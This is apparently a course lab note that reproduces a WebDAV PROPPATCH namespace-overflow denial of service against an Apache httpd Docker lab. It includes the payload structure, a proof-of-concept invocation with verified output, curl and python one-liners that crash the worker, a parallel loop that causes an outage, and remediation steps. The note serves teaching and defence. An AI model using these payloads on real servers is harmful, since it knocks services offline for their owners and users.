---
type: example
status: established
created: 2026-10-29
updated: 2026-10-29
name: inf2005-acw3-mod-dav-fs-proppatch-dos
description: INF2005 ACW3 — reproducible CVE-2026-93546 mod_dav_fs worker-crash DoS via a many-namespace PROPPATCH, with safe lab hardening
metadata:
  type: example
domain: cyber-security
course: INF2005
tags: [cve-2026-93546, apache, mod_dav_fs, webdav, proppatch, cwe-190, integer-overflow, dos, docker, pentest, acw3]
---

# INF2005 ACW3 — CVE-2026-93546 mod_dav_fs PROPPATCH worker-crash (reproducible PoC)

**CVE:** CVE-2026-93546 · Apache HTTP Server ≤ 2.4.68, `mod_dav_fs` · CWE-190 integer overflow · CVSS 8.8 (High).
**Target:** local `vulnerable-env` Docker lab (`httpd:2.4.68`, WebDAV + digest auth), `http://localhost:8080/dav/`.
**Lesson reference:** [[learning/webdav-proppatch-namespace-overflow]]
**Verified:** 2026-10-29 against the lab.

## The vulnerability in one line

An authenticated WebDAV user with write access sends a `PROPPATCH` body that
declares a **very large number of distinct XML namespaces**; a namespace-count
counter overflows (CWE-190), the worker blows up O(n²) in memory/CPU and dies
(SIGSEGV with free RAM, OOM-kill when memory-capped), and the resource's `.DAV`
property database is left bloated/corrupted.

## Payload shape (the part that's easy to get wrong)

Correct — many distinct namespace **declarations**:

```xml
<?xml version="1.0" encoding="utf-8"?>
<D:propertyupdate xmlns:D="DAV:"><D:set><D:prop>
  <p xmlns="u0"/><p xmlns="u1"/> ... <p xmlns="u44999"/>
</D:prop></D:set></D:propertyupdate>
```

Wrong (what fails and produces no crash):
- **One giant namespace token** (`xmlns:P="AAAA…"` ~1 MB) → `413` (hits default
  `LimitXMLRequestBody` 1 MB) or `207`. Never crashes.
- **A well-formed PROPPATCH** → `207 Multi-Status` (use as the control).

## Reproduce (one command)

PoC: `INF2005-ACW3/vulnerable-env/guides/poc_dav_overflow.py`

```
python3 poc_dav_overflow.py http://localhost:8080 45000
```

Verified output:

```
[control] well-formed PROPPATCH -> 207 (expect 207)
[attack]  PROPPATCH: 844012 bytes, 45000 namespace declarations
[attack]  WORKER DIED: ConnectionError after 5.6s
[recovery] 207  (service auto-recovers after the child respawns)
```

The `ConnectionError` is the exploit landing: the worker is killed mid-response,
so the TCP connection resets before any HTTP status returns.

Manual equivalent:

```bash
python3 -c 'print("<?xml version=\"1.0\"?><D:propertyupdate xmlns:D=\"DAV:\"><D:set><D:prop>"+"".join("<p xmlns=\"u%d\"/>"%i for i in range(45000))+"</D:prop></D:set></D:propertyupdate>")' > /tmp/pp.xml
echo x | curl -s --digest -u labuser:labpass123 -T - http://localhost:8080/dav/target.txt -o /dev/null
curl -s --digest -u labuser:labpass123 -X PROPPATCH -H "Content-Type: application/xml" \
     --data-binary @/tmp/pp.xml http://localhost:8080/dav/target.txt -o /dev/null -w "code=%{http_code}\n"
```

Make it a *visible* service outage (not just one dead worker):

```bash
for i in 1 2 3 4 5 6; do python3 poc_dav_overflow.py http://localhost:8080 45000 & done
# meanwhile the site times out, then recovers once the flood stops
```

## Three traps (why "the website doesn't crash" is reported)

1. **Payload shape** — count of namespaces, not one big token (above).
2. **Worker crash ≠ container down** — Apache's parent respawns the child in ~1 s,
   so `docker ps` stays *Up* and `RestartCount` stays `0`. Evidence is at the
   worker level: connection reset, `docker stats` memory spike, and the error log
   line `AH00052 … child pid N exit signal Segmentation fault (11)`.
3. **Uncapped memory is dangerous** — one ~1 MB request drove the worker past
   **5 GB**; a 70k–200k sweep hit **>10.8 GB** and nearly OOM'd the host.

## Safe, reliable demo hardening

Pin the target container's memory in `docker-compose.yml`:

```yaml
    mem_limit: 512m
    memswap_limit: 512m
```

Then ~45k namespaces kills the worker by OOM in ~5 s, the host stays safe, and
the service auto-recovers. The authentic SIGSEGV (CWE-190 corruption) only appears
with lots of free RAM — reproduce that only on a disposable VM.

## Remediation

- **Fix:** upgrade Apache httpd 2.4.68 → **2.4.69+** (removes the overflow).
- **Mitigate:** tighten `LimitXMLRequestBody` (e.g. 100 KB — the 1 MB default is
  *not* low enough); bound worker memory (`RLimitMEM` / container `mem_limit` /
  systemd `MemoryMax`); `Dav Off` on read-only collections; WAF rule rejecting
  bodies with abnormally many `xmlns` declarations; network-restrict WebDAV.

## Tooling gotchas

- `curl --digest` with a large body returns a confusing final `401` (the auth
  retry doesn't cleanly re-send the big body); use Python `requests`
  (`HTTPDigestAuth`) to send the body in one authenticated request.
- `python -I` ignores user site-packages, so `requests` isn't importable under it.
